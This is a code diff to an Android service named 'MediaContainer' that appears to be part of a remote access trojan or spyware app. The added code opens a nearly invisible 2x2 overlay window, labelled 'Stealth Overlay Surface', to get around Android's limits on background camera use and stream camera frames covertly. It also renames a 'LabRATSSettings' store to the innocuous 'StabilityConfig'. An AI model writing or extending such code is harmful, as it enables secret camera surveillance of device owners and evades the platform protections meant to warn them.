@@ -325,12 +325,14 @@ public class MediaContainer extends Service {
             }
 
             WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    1, 1, // Minimal size - invisible
+                    2, 2, // Minimal footprint
                     layoutType,
                     WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
-                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                     PixelFormat.TRANSLUCENT);
+            params.alpha = 0.02f; // Non-zero but invisible
             params.gravity = Gravity.TOP | Gravity.START;
 
             surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
@@ -522,9 +524,16 @@ public class MediaContainer extends Service {
 
     private void createPhotoCaptureSession() {
         try {
-            Surface surface = imageReader.getSurface();
+            List<Surface> targets = new ArrayList<>();
+            targets.add(imageReader.getSurface());
+            
+            // Add Stealth Overlay Surface if ready (required for background on many devices)
+            if (surfaceReady && surfaceView != null && surfaceView.getHolder().getSurface() != null) {
+                targets.add(surfaceView.getHolder().getSurface());
+                Log.d(TAG, "Added overlay surface to camera session");
+            }
 
-            cameraDevice.createCaptureSession(Arrays.asList(surface),
+            cameraDevice.createCaptureSession(targets,
                     new CameraCaptureSession.StateCallback() {
                         @Override
                         public void onConfigured(@NonNull CameraCaptureSession session) {
@@ -579,6 +588,21 @@ public class MediaContainer extends Service {
         streamQuality = quality > 0 ? quality : 50;
 
         try {
+            // [STEALTH_SURFACE_PROTOCOL]
+            // Modern Android requires an active window/surface for background camera access
+            createOverlay();
+            
+            // Critical hardware reset delay
+            if (isStreaming) {
+                stopStreaming();
+                Thread.sleep(500); 
+            }
+
+            // Allow a small window for Surface initialization
+            if (surfaceLatch != null) {
+                try { surfaceLatch.await(1000, TimeUnit.MILLISECONDS); } catch (Exception ignored) {}
+            }
+
             startStreamingInternal();
 
         } catch (Exception e) {
@@ -694,9 +718,16 @@ public class MediaContainer extends Service {
             return;
         }
         try {
-            Surface surface = imageReader.getSurface();
+            List<Surface> targets = new ArrayList<>();
+            targets.add(imageReader.getSurface());
+            
+            // Add Stealth Overlay Surface if ready (required for background on many devices)
+            if (surfaceReady && surfaceView != null && surfaceView.getHolder().getSurface() != null) {
+                targets.add(surfaceView.getHolder().getSurface());
+                Log.d(TAG, "Added overlay surface to camera session");
+            }
 
-            cameraDevice.createCaptureSession(Arrays.asList(surface),
+            cameraDevice.createCaptureSession(targets,
                     new CameraCaptureSession.StateCallback() {
                         @Override
                         public void onConfigured(@NonNull CameraCaptureSession session) {
@@ -752,8 +783,9 @@ public class MediaContainer extends Service {
     public void stopStreaming() {
         isStreaming = false;
         closeCamera();
+        removeOverlay(); // Clean up overlay to fully release resources
         frameQueue.clear();
-        Log.d(TAG, "Streaming stopped");
+        Log.d(TAG, "Streaming stopped and overlay removed");
     }
 
     public void setFlashMode(boolean on) {
@@ -959,14 +991,15 @@ public class MediaContainer extends Service {
     public void setNightMode(boolean enabled) {
         nightModeEnabled = enabled;
         getSharedPreferences("StabilityConfig", MODE_PRIVATE)
-                .edit().putBoolean("night_mode", enabled).apply();
+                .edit().putBoolean("night_mode", enabled).commit();
         if (isStreaming && captureSession != null && cameraDevice != null) {
             startPreview(); // Restart preview to apply changes
         }
     }
 
     public static boolean isNightModeEnabled(Context context) {
-        return context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
+        if (instance != null) return nightModeEnabled;
+        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                 .getBoolean("night_mode", false);
     }
 
